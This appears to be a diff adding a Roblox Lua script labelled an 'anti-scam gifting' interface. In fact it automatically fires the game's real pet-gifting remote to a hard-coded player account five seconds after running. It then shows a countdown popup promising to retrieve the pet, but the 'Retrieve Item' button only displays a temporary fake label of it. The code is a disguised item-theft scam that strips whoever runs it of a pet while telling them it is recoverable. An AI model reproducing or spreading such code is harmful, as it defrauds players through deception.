@@ -1,0 +1,109 @@
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
+
+-- GUI Setup
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "AntiScamGiftingUI"
+screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Countdown Popup
+local function showRetrievePopup(petName)
+	local popup = Instance.new("Frame")
+	popup.Size = UDim2.new(0, 260, 0, 120)
+	popup.Position = UDim2.new(0.5, -130, 0.5, -60)
+	popup.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+	popup.BorderSizePixel = 0
+	popup.Parent = screenGui
+
+	local label = Instance.new("TextLabel")
+	label.Size = UDim2.new(1, 0, 0.4, 0)
+	label.Position = UDim2.new(0, 0, 0, 10)
+	label.BackgroundTransparency = 1
+	label.Font = Enum.Font.SourceSansBold
+	label.TextSize = 20
+	label.TextColor3 = Color3.new(1, 1, 1)
+	label.Text = "Retrieving item in 10s..."
+	label.Parent = popup
+
+	local retrieveBtn = Instance.new("TextButton")
+	retrieveBtn.Size = UDim2.new(0.8, 0, 0.3, 0)
+	retrieveBtn.Position = UDim2.new(0.1, 0, 0.6, 0)
+	retrieveBtn.Text = "Please wait..."
+	retrieveBtn.Font = Enum.Font.SourceSansBold
+	retrieveBtn.TextSize = 18
+	retrieveBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+	retrieveBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+	retrieveBtn.AutoButtonColor = false
+	retrieveBtn.Active = false
+	retrieveBtn.Parent = popup
+
+	-- Countdown logic
+	local countdown = 10
+	local countdownConnection
+	countdownConnection = game:GetService("RunService").RenderStepped:Connect(function(dt)
+		if countdown <= 0 then
+			countdownConnection:Disconnect()
+			label.Text = "You can now retrieve the item"
+			retrieveBtn.Text = "Retrieve Item"
+			retrieveBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
+			retrieveBtn.TextColor3 = Color3.new(1, 1, 1)
+			retrieveBtn.AutoButtonColor = true
+			retrieveBtn.Active = true
+			retrieveBtn.MouseButton1Click:Connect(function()
+				-- Fake clone of item
+				local visualItem = Instance.new("TextLabel", screenGui)
+				visualItem.Size = UDim2.new(0, 160, 0, 30)
+				visualItem.Position = UDim2.new(1, -170, 1, -40)
+				visualItem.Text = petName .. " (Visual)"
+				visualItem.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+				visualItem.TextColor3 = Color3.new(1, 1, 1)
+				visualItem.Font = Enum.Font.SourceSans
+				visualItem.TextSize = 16
+				task.delay(6, function()
+					visualItem:Destroy()
+				end)
+				popup:Destroy()
+			end)
+		else
+			label.Text = "Retrieving item in " .. countdown .. "s..."
+			retrieveBtn.Text = "Please wait (" .. countdown .. "s)"
+			countdown -= 1
+			task.wait(1)
+		end
+	end)
+end
+
+-- Anti-Scam Gifting Toggle
+local antiScamEnabled = true -- always on for simplicity
+
+-- Wrap gifting logic
+local function fakeGivePet(targetPlayer, petName)
+	if antiScamEnabled then
+		print("Sending gift to", targetPlayer.Name)
+
+		-- Call real remote
+		PetGiftingService:FireServer("GivePet", targetPlayer)
+
+		-- Show popup
+		task.delay(1.2, function()
+			showRetrievePopup(petName or "FakePet")
+		end)
+	else
+		PetGiftingService:FireServer("GivePet", targetPlayer)
+	end
+end
+
+-- ✅ Example test call
+-- After 5 seconds, this will simulate sending a gift
+task.delay(5, function()
+	local target = Players:FindFirstChild("amarashane062")
+	if target then
+		fakeGivePet(target, "Golden Raccoon")
+	end
+end)
